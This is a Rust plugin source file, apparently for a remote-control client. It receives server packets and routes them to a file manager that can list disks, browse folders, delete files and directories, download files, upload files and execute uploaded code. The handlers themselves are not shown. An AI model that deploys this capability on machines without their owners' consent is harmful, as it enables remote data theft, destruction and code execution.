#![crate_type = "cdylib"]

use std::sync::Mutex;
use lazy_static::lazy_static;
use common::packets::{ServerboundPacket, Packet};
mod file_manager;
use file_manager::FileManager;

lazy_static! {
    static ref FILE_MANAGER: Mutex<FileManager> = Mutex::new(FileManager::new());
}

type PluginCallback = unsafe extern "C" fn(data_ptr: *const u8, data_len: usize);
static mut CALLBACK: Option<PluginCallback> = None;

#[no_mangle]
pub extern "C" fn plugin_init(callback: PluginCallback) {
    println!("🧠 Plugin initialized!");
    let _unused = FILE_MANAGER.lock().unwrap();
    unsafe {
        CALLBACK = Some(callback);
    }
}

pub fn send_callback(packet: &ServerboundPacket) {
    let serialized = packet.serialized();
    let leaked = Box::leak(serialized.into_boxed_slice());

    unsafe {
        if let Some(callback) = CALLBACK {
            callback(leaked.as_ptr(), leaked.len());
        }
    }
}

#[no_mangle]
pub extern "C" fn plugin_execute(
    input_ptr: *const u8,
    input_len: usize,
    _output_ptr: *mut *const u8,
    _output_len: *mut usize,
) -> i32 {
    unsafe {
        let input_slice = std::slice::from_raw_parts(input_ptr, input_len);

        match common::packets::ClientboundPacket::deserialized(input_slice) {
            Ok((packet, _)) => {
                let mut manager = FILE_MANAGER.lock().unwrap();

                match packet {
                    common::packets::ClientboundPacket::AvailableDisks => {
                        manager.list_available_disks();
                    }
                    common::packets::ClientboundPacket::ViewDir(path) => {
                        manager.view_folder(&path);
                    }
                    common::packets::ClientboundPacket::PreviousDir => {
                        manager.previous_dir();
                    }
                    common::packets::ClientboundPacket::RemoveDir(path) => {
                        manager.remove_directory(&path);
                    }
                    common::packets::ClientboundPacket::RemoveFile(path) => {
                        manager.remove_file(&path);
                    }
                    common::packets::ClientboundPacket::DownloadFile(path) => {
                        manager.download_file(&path);
                    }
                    common::packets::ClientboundPacket::UploadAndExecute(file_data) => {
                        manager.upload_and_execute(file_data);
                    }
                    common::packets::ClientboundPacket::ExecuteFile(path) => {
                        manager.execute_file(&path);
                    }
                    common::packets::ClientboundPacket::UploadFile(target_folder, file_data) => {
                        manager.upload_file(target_folder, file_data);
                    }
                    _ => {
                        println!("⚠️ Plugin: Unsupported packet {:?}", packet);
                        return -1;
                    }
                }

                0
            }
            Err(e) => {
                println!("⚠️ Plugin: Failed to deserialize packet: {:?}", e);
                -2
            }
        }
    }
}